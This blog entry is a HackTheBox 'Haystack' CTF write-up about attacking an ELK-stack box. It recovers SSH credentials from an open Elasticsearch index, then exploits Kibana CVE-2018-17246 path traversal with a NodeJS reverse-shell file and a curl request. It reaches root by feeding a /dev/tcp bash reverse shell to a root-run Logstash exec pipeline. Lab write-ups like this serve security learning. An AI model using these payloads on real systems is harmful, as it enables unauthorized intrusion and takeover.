        <content type="html"><![CDATA[<img width="582" alt="haystack-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158099-02e7b280-9886-11ea-8799-d7f5df9a20bb.png"><p>Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario.</p><p>First thing first, let’s add the box IP to the hosts file: </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">'10.10.10.115 haystack.htb'</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC 10.10.10.115</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-08-29 22:08 CEST</span><br><span class="line">Nmap scan report for haystack.htb (10.10.10.115)</span><br><span class="line">Host is up (0.75s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp   open  http    nginx 1.12.2</span><br><span class="line">9200&#x2F;tcp open  http    nginx 1.12.2</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 87.23 seconds</span><br></pre></td></tr></table></figure><p>Alright nothing suprising here: SSH, HTTP and 9200 which is port used by Elasticsearch. Let’s start.</p><h3 id="Stenography"><a href="#Stenography" class="headerlink" title="Stenography"></a>Stenography</h3><p>Once opening <a href="http://haystack.htb" target="_blank" rel="noopener">http://haystack.htb</a> we are greeted with a single image.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"needle.jpg"</span> /&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>gobuster</code> doesn’t find anything else interresting. So let’s check this image :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget haystack.htb/needle.jpg</span><br><span class="line">[hg8@archbook ~]$ file needle.jpg</span><br><span class="line">needle.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=paint.net 4.1.1], baseline, precision 8, 1200x803, components 3</span><br></pre></td></tr></table></figure><p>So far so good, nothing suspicious. Let’s see if we can find strings in it :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ strings needle.jpg</span><br><span class="line">[...]</span><br><span class="line">bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==</span><br></pre></td></tr></table></figure><p>Let’s decode this base64 string :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg=="</span> | base64 -d</span><br><span class="line">la aguja en el pajar es <span class="string">"clave"</span></span><br></pre></td></tr></table></figure><p>A hint. Let’s keep <code>clave</code> in mind (key in Spanish). I think there is nothing else to find on the http service so let’s move on to the Elasticsearch instance.</p><h3 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h3><p>Opening port 9200 return the following json:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http haystack.htb:9200</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"cluster_name"</span>: <span class="string">"elasticsearch"</span>,</span><br><span class="line">    <span class="attr">"cluster_uuid"</span>: <span class="string">"pjrX7V_gSFmJY-DxP4tCQg"</span>,</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"iQEYHgS"</span>,</span><br><span class="line">    <span class="attr">"tagline"</span>: <span class="string">"You Know, for Search"</span>,</span><br><span class="line">    <span class="attr">"version"</span>: &#123;</span><br><span class="line">        <span class="attr">"build_date"</span>: <span class="string">"2018-09-26T13:34:09.098244Z"</span>,</span><br><span class="line">        <span class="attr">"build_flavor"</span>: <span class="string">"default"</span>,</span><br><span class="line">        <span class="attr">"build_hash"</span>: <span class="string">"04711c2"</span>,</span><br><span class="line">        <span class="attr">"build_snapshot"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"build_type"</span>: <span class="string">"rpm"</span>,</span><br><span class="line">        <span class="attr">"lucene_version"</span>: <span class="string">"7.4.0"</span>,</span><br><span class="line">        <span class="attr">"minimum_index_compatibility_version"</span>: <span class="string">"5.0.0"</span>,</span><br><span class="line">        <span class="attr">"minimum_wire_compatibility_version"</span>: <span class="string">"5.6.0"</span>,</span><br><span class="line">        <span class="attr">"number"</span>: <span class="string">"6.4.2"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It’s a classic Elastic cluster. On version 6.4.2 (not the most recent one).</p><p>We can use the <code>_cat</code> endpoint to list all indexes :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http &quot;haystack.htb:9200&#x2F;_cat&#x2F;indices&quot;</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line"></span><br><span class="line">.kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0    2 0  14.3kb  14.3kb</span><br><span class="line">quotes  ZG2D1IqkQNiNZmi2HRImnQ 5 1  253 0 262.7kb 262.7kb</span><br><span class="line">bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb</span><br></pre></td></tr></table></figure><p>So we have <code>bank</code> with 1000 records and <code>quotes</code> with 253 records. Let’s search across those documents to see if we can find something interesting with our previous hint in mind.</p><p>According the the <a href="https://www.elastic.co/guide/en/elasticsearch/reference/6.4/search-search.html" target="_blank" rel="noopener">documentation</a>, we can use the <code>_search</code> endpoint to search across all documents. Searching for the keyword <code>key</code> doesn’t seem to return any interesting user or information. Let’s try with the <code>clave</code> keyword we found in the image :</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http "haystack.htb:9200/_search?q=clave"</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"_shards"</span>: &#123;</span><br><span class="line">        <span class="attr">"failed"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"skipped"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"successful"</span>: <span class="number">11</span>,</span><br><span class="line">        <span class="attr">"total"</span>: <span class="number">11</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"hits"</span>: &#123;</span><br><span class="line">        <span class="attr">"hits"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"_id"</span>: <span class="string">"45"</span>,</span><br><span class="line">                <span class="attr">"_index"</span>: <span class="string">"quotes"</span>,</span><br><span class="line">                <span class="attr">"_score"</span>: <span class="number">5.9335938</span>,</span><br><span class="line">                <span class="attr">"_source"</span>: &#123;</span><br><span class="line">                    <span class="attr">"quote"</span>: <span class="string">"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"_type"</span>: <span class="string">"quote"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"_id"</span>: <span class="string">"111"</span>,</span><br><span class="line">                <span class="attr">"_index"</span>: <span class="string">"quotes"</span>,</span><br><span class="line">                <span class="attr">"_score"</span>: <span class="number">5.3459888</span>,</span><br><span class="line">                <span class="attr">"_source"</span>: &#123;</span><br><span class="line">                    <span class="attr">"quote"</span>: <span class="string">"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"_type"</span>: <span class="string">"quote"</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"max_score"</span>: <span class="number">5.9335938</span>,</span><br><span class="line">        <span class="attr">"total"</span>: <span class="number">2</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"timed_out"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"took"</span>: <span class="number">25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Neat, sounds promising. Let’s decode :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">'dXNlcjogc2VjdXJpdHkg'</span> | base64 -d</span><br><span class="line">user: security</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">'cGFzczogc3BhbmlzaC5pcy5rZXk='</span> | base64 -d</span><br><span class="line">pass: spanish.is.key</span><br></pre></td></tr></table></figure><p>An username and a password, couldn’t ask for anything better! Is that SSH credentials ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh security@haystack.htb</span><br><span class="line">security@haystack.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Last login: Thu Aug 29 16:24:15 2019 from 10.10.10.85</span></span><br><span class="line"><span class="string">[security@haystack ~]$</span></span><br><span class="line"><span class="string">[security@haystack ~]$ cat user.txt</span></span><br><span class="line"><span class="string">04d1xxxxxxxxxxxxxxx8eb929</span></span><br></pre></td></tr></table></figure><p>First step done. Time for root.</p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>Now that we have user let’s try to elevate privilege. Privilege enumeration scripts output nothing really interresting so let’s focus on the ELK stack again which seems the core part of this box.</p><h3 id="Pivot-security-gt-kibana-user"><a href="#Pivot-security-gt-kibana-user" class="headerlink" title="Pivot security -&gt; kibana user"></a>Pivot security -&gt; kibana user</h3><p>Kibana and Logstash are installed but configuration files are inaccesible to the <code>security</code> user :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[security@haystack conf.d]$ cat /etc/passwd</span><br><span class="line">[...]</span><br><span class="line">security:x:1000:1000:security:/home/security:/bin/bash</span><br><span class="line">elasticsearch:x:997:995:elasticsearch user:/nonexistent:/sbin/nologin</span><br><span class="line">logstash:x:996:994:logstash:/usr/share/logstash:/sbin/nologin</span><br><span class="line">kibana:x:994:992:kibana service user:/home/kibana:/sbin/nologin</span><br><span class="line"></span><br><span class="line">[security@haystack conf.d]$ <span class="built_in">cd</span> /opt/kibana/</span><br><span class="line">-bash: <span class="built_in">cd</span>: /opt/kibana/: Permiso denegado</span><br><span class="line"></span><br><span class="line">[security@haystack conf.d]$ cat /etc/logstash/conf.d/filter.conf</span><br><span class="line">cat: /etc/logstash/conf.d/filter.conf: Permiso denegado</span><br></pre></td></tr></table></figure><p>Seems like we will need to pivot to <code>Kibana</code> or <code>Logstash</code> user to make progress.</p><p>For now we don’t have informations about neither Kibana nor Logstash. Let’s check Elasticsearch again :</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http haystack.htb:9200</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">"cluster_name"</span>: <span class="string">"elasticsearch"</span>,</span><br><span class="line">    <span class="attr">"cluster_uuid"</span>: <span class="string">"pjrX7V_gSFmJY-DxP4tCQg"</span>,</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"iQEYHgS"</span>,</span><br><span class="line">    <span class="attr">"tagline"</span>: <span class="string">"You Know, for Search"</span>,</span><br><span class="line">    <span class="attr">"version"</span>: &#123;</span><br><span class="line">        <span class="attr">"build_date"</span>: <span class="string">"2018-09-26T13:34:09.098244Z"</span>,</span><br><span class="line">        <span class="attr">"build_flavor"</span>: <span class="string">"default"</span>,</span><br><span class="line">        <span class="attr">"build_hash"</span>: <span class="string">"04711c2"</span>,</span><br><span class="line">        <span class="attr">"build_snapshot"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"build_type"</span>: <span class="string">"rpm"</span>,</span><br><span class="line">        <span class="attr">"lucene_version"</span>: <span class="string">"7.4.0"</span>,</span><br><span class="line">        <span class="attr">"minimum_index_compatibility_version"</span>: <span class="string">"5.0.0"</span>,</span><br><span class="line">        <span class="attr">"minimum_wire_compatibility_version"</span>: <span class="string">"5.6.0"</span>,</span><br><span class="line">        <span class="attr">"number"</span>: <span class="string">"6.4.2"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Elasticsearch is in version 6.4.2 for a build date of September 2018. That’s quite old.</p><p>And indeed after a bit of GoogleFu we stumbled upon CVE-2018-17246 :</p><blockquote><p>Kibana versions before 6.4.3 and 5.6.13 contain an arbitrary file inclusion flaw in the Console plugin. An attacker with access to the Kibana Console API could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.</p></blockquote><p>More informations are available on <a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/" target="_blank" rel="noopener">CyberArk website</a> and gives us example on how to run this exploit.</p><p>First we need to write a NodeJS reserve shell (I used the one found <a href="https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell#the-nodejs-reverse-shell" target="_blank" rel="noopener">here</a>) to the <code>/tmp/hg8.js</code> folder:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">"net"</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">"child_process"</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">"/bin/sh"</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">8585</span>, <span class="string">"10.10.10.10"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>Start <code>netcat</code> utility to listen for the reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Let’s now launch the exploit on the local instance of Kibana.<br>According to the <a href="https://www.elastic.co/guide/en/kibana/current/settings.html" target="_blank" rel="noopener">documentation</a> Kibana runs on port <code>5601</code> :</p><blockquote><p>The default settings configure Kibana to run on localhost:5601.</p></blockquote><p>We now have every informations needed, let’s launch our exploit:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/hg8.js"</span></span><br></pre></td></tr></table></figure><p>On our <code>netcat</code> the connection appear :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.10:53792</span><br><span class="line">id</span><br><span class="line">uid&#x3D;994(kibana) gid&#x3D;992(kibana) grupos&#x3D;992(kibana) contexto&#x3D;system_u:system_r:unconfined_service_t:s0</span><br></pre></td></tr></table></figure><p>Good we are on Kibana user now.</p><p>Let’s upgrade our shell to a fully interactive one for easiest work (check out this <a href="https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/" target="_blank" rel="noopener">blog post</a> for more informations):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ <span class="built_in">export</span> SHELL=/bin/bash</span><br><span class="line">$ <span class="comment"># CTRL + Z</span></span><br><span class="line">$ stty raw -<span class="built_in">echo</span>;<span class="built_in">fg</span></span><br><span class="line">                        reset</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h3 id="Logstash-gt-root"><a href="#Logstash-gt-root" class="headerlink" title="Logstash -&gt; root"></a>Logstash -&gt; root</h3><p>Looking around show that <code>/opt/kibana/</code> turn out to be empty, <code>/etc/elasticsearch/</code> still can’t be accessed.</p><p><code>/etc/logstash/</code> belong to <code>kibana</code> group so we can read the content. Let’s dig.</p><p>As a reminder Logstash is a tool that collect various logs, parses them, and writes the parsed data to an Elasticsearch cluster :</p><blockquote><p>Logstash (part of the Elastic Stack) integrates data from any source, in any format with this flexible, open source collection, parsing, and enrichment pipeline.<br><a href="https://www.elastic.co/fr/products/logstash" target="_blank" rel="noopener">https://www.elastic.co/fr/products/logstash</a></p></blockquote><p>Once reading the <code>startup.options</code> file, an information catch the eye :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/logstash/startup.options</span><br><span class="line"><span class="comment"># user and group id to be invoked as</span></span><br><span class="line"><span class="comment">#LS_USER=logstash</span></span><br><span class="line"><span class="comment">#LS_GROUP=logstash</span></span><br><span class="line">LS_USER=root</span><br><span class="line">LS_GROUP=root</span><br></pre></td></tr></table></figure><p>So Logstash will run not as <code>logstash</code> user but as <code>root</code> user. We are on the right track.<br>The <code>conf.d</code> folder contains three files. According to its contents, here what each file do:</p><ul><li><code>input.conf</code> tell Logstash where to search for logs.</li><li><code>filter.conf</code> filter what data is treated and what is ignored.</li><li><code>output.conf</code> define what to do with parsed data.</li></ul><p>Let’s look first at <code>input.conf</code> and <code>output.conf</code> :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ cat input.conf</span><br><span class="line">input &#123;</span><br><span class="line">    file &#123;</span><br><span class="line">        path =&gt; <span class="string">"/opt/kibana/logstash_*"</span></span><br><span class="line">        start_position =&gt; <span class="string">"beginning"</span></span><br><span class="line">        sincedb_path =&gt; <span class="string">"/dev/null"</span></span><br><span class="line">        stat_interval =&gt; <span class="string">"10 second"</span></span><br><span class="line">        <span class="built_in">type</span> =&gt; <span class="string">"execute"</span></span><br><span class="line">        mode =&gt; <span class="string">"read"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ cat output.conf</span><br><span class="line">output &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">"execute"</span> &#123;</span><br><span class="line">        stdout &#123; codec =&gt; json &#125;</span><br><span class="line">        <span class="built_in">exec</span> &#123;</span><br><span class="line">            <span class="built_in">command</span> =&gt; <span class="string">"%&#123;comando&#125; &amp;"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>According to this config Logstash will, every 10 seconds :</p><p>1) Check for file named <code>logstash_*</code> in the <code>/opt/kibana/</code> folder.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">path &#x3D;&gt; &quot;&#x2F;opt&#x2F;kibana&#x2F;logstash_*&quot;</span><br><span class="line">stat_interval &#x3D;&gt; &quot;10 second&quot;</span><br><span class="line">type &#x3D;&gt; &quot;execute&quot;</span><br><span class="line">mode &#x3D;&gt; &quot;read&quot;</span><br></pre></td></tr></table></figure><p>2) Check the file content for data matching filters (a regex) defined in <code>filter.conf</code>.</p><p>3) Send the matched data to be executed in background :</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec &#123;</span><br><span class="line">    command =&gt; "%&#123;comando&#125; &amp;"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Good, it seems we can write any command in a file named <code>/opt/kibana/logstash_*</code> and it should be run as root. Neat.<br>But first we have to make sure the command match the filter to be parsed correctly by logstash.</p><p>Let’s understand that filter :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat filter.conf</span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">"execute"</span> &#123;</span><br><span class="line">        grok &#123;</span><br><span class="line">            match =&gt; &#123; <span class="string">"message"</span> =&gt; <span class="string">"Ejecutar\s*comando\s*:\s+%&#123;GREEDYDATA:comando&#125;"</span> &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>That’s a complicated syntax at first look. Logstash documentation present <code>grok</code> as :</p><blockquote><p>Grok is a great way to parse unstructured log data into something structured and queryable.</p></blockquote><p>So it’s a kind of regex. Let’s understand it step by step :</p><p><code>Ejecutar\s*comando\s*:\s+</code> is a simple regex, meaning that the file have to begin with this sentence.<br><code>%{GREEDYDATA:comando}</code> is the interresting grok part. According to the <a href="https://github.com/logstash-plugins/logstash-patterns-core/blob/master/patterns/grok-patterns" target="_blank" rel="noopener">grok pattern source</a> <code>GREEDYDATA</code> correspond to a <code>.*</code> in regex.</p><p>So basically, when given the following line : <code>Ejecutar comando : id</code> grok will match the line and take the <code>id</code> part and parse it as <code>commando</code> variable to the Logstash output (<code>command =&gt; &quot;%{comando} &amp;&quot;</code> as seen in <code>output.conf</code>).</p><p>Let’s put all those informations together and try to get a root shell.</p><p>First as usual let’s open a <code>netcat</code> listener :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 4485</span><br><span class="line">Listening on any address 4485 (assyst-dr)</span><br></pre></td></tr></table></figure><p>Then create the file Logstash will take as input (<code>/opt/kibana/logstash_*</code>) with the correct content matching the <code>filter.conf</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"bash -i &gt;&amp; /dev/tcp/10.10.10.10/4485 0&gt;&amp;1"</span> &gt; /opt/kibana/logstash_hg8</span><br></pre></td></tr></table></figure><p>We then wait a bit and fairly quicky we get an incoming connection as root:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 4485</span><br><span class="line">Listening on any address 4485 (assyst-dr)</span><br><span class="line">Connection from 10.10.10.115:49446</span><br><span class="line">bash: no hay control de trabajos en este shell</span><br><span class="line">[root@haystack /]<span class="comment"># cat /root/root.txt</span></span><br><span class="line">3f5f727xxxxxxxxxxxx9d92</span><br><span class="line">[root@haystack /]<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>As always do not hesitate to contact me for any questions or feedbacks ;)</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> haystack </tag>
            
            <tag> gobuster </tag>
            
            <tag> steganography </tag>
            
            <tag> elasticsearch </tag>
            
            <tag> logstash </tag>
            
            <tag> kibana </tag>
            
            <tag> elk </tag>
            
            <tag> cve-2018-17246 </tag>
            
            <tag> lfi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Writeup</title>
      <link href="/posts/writeup/"/>
      <url>/posts/writeup/</url>
      
